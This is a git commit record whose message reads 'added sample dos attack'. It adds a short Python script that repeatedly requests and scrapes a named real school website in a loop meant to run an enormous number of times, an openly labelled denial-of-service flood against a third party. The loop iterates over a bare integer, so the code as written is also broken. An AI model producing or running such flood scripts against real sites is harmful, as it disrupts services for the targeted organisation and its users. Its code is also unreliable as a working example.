f6107d1a6e4a0fc79e12d4e0812c82b33f18e00c
YourNeighborhoodProgrammer <142511037+YourNeighborhoodProgrammer@users.noreply.github.com>
2023-11-02 09:48:04 +0700

    added sample dos attack

---
+++ main.py
@@ -0,0 +1,18 @@
+import requests
+from bs4 import BeautifulSoup
+
+dosSent = 97764325817654936287547638234872534852874354274527654376257
+
+
+def scrape_website(url):
+    response = requests.get(url)
+    soup = BeautifulSoup(response.text, 'html.parser')
+
+    for link in soup.find_all('a'):
+        print(link.get('href'))
+
+
+for i in dosSent:
+    scrape_website('https://footprintsschool.edu.kh')
+    print(i)
+print("operation complete")
